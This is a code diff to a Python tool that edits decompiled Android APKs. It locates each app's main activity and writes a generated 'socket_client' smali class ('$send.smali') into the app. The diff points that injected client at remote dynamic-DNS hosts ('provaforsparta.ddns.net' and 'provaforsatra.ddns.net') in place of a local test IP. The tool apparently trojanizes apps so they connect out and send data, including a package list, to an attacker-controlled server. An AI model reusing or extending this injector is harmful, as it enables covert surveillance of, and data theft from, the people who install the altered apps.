@@ -37,6 +37,8 @@ def check_main_activity_name(file):
 
             if 'android:name' in diz_attrs and diz_attrs['android:name'] == 'android.intent.action.MAIN':
                 print(activity.attrs['android:name'])
+                if '.' in activity.attrs['android:name']:
+                    return activity.attrs['android:name'].replace('.', "")
                 return activity.attrs['android:name']
 
 
@@ -49,8 +51,8 @@ def get_main_activity(filename):
         activities.append(activity.attrib)
 
     activityMain = check_main_activity_name(filename)
-    activityMainPath = r'decompiled_apk/' + filename_cutter(filename) + "/smali/" + activityMain.replace('.',
-                                                                                                         '/') + '.smali'
+    print(activityMain)
+    activityMainPath = r'decompiled_apk/' + filename_cutter(filename) + "/smali/" + activityMain.replace('.','/') + '.smali'
 
     if not os.path.exists(activityMainPath):
         print('NOT EXITS')
@@ -109,10 +111,10 @@ def check_onCreate_access_keyword(activityMain_content):
 
 def add_socket_client(file, activityMainPath, path):
     print(activityMainPath)
+    activity_main_path = activityMainPath.replace(path, '').replace('.smali', '')
     package_app = get_package(file)
     path.replace(".", "/")
-    app_name = activityMainPath.split("/")[-1].strip(".smali")
-    app_package = activityMainPath.replace(app_name + ".smali", "")
+
     # TODO ADD DNS ADDRESS
     # ipv4 = os.popen('ifconfig en0').read().split("inet ")[1].split(" ")[0]
     #
@@ -122,7 +124,7 @@ def add_socket_client(file, activityMainPath, path):
     invoke = original_file[0][1]
     socket_client = original_file[0][2]
     socket_client = re.sub(MAIN_ACTIVITY_PATH, 'L' + package_app.replace(".", "/"), socket_client)
-    socket_client = re.sub(MAIN_ACTIVITY_NAME, app_name, socket_client)
+    socket_client = re.sub(MAIN_ACTIVITY_NAME, path, socket_client)
     socket_client = re.sub('192.168.1.15', 'provaforsparta.ddns.net', socket_client)
 
     package_list = PACKAGE_LIST['init'] + str(len(session['package'])) + PACKAGE_LIST['new_array']
@@ -136,7 +138,7 @@ def add_socket_client(file, activityMainPath, path):
     package_list += PACKAGE_LIST['after_array'] + PACKAGE_LIST['log'] + PACKAGE_LIST['final']
     socket_client += package_list
 
-    send_file = open(os.path.join(app_package, app_name + "$send.smali"), "w+")
+    send_file = open(os.path.join(activity_main_path, path+"$send.smali"), "w+")
     send_file.write(socket_client)
     send_file.close()
 
@@ -241,7 +243,7 @@ def mainActivity_socket_client(file, injection_type):
 
     send = re.sub(MAIN_ACTIVITY_PATH, 'L' + fer.replace(".", "/"), send)
     send = re.sub(MAIN_ACTIVITY_NAME, app_name, send)
-    send = re.sub('192.168.1.15', ipv4, send)
+    send = re.sub('192.168.1.15', 'provaforsatra.ddns.net', send)
 
     print(send)
 
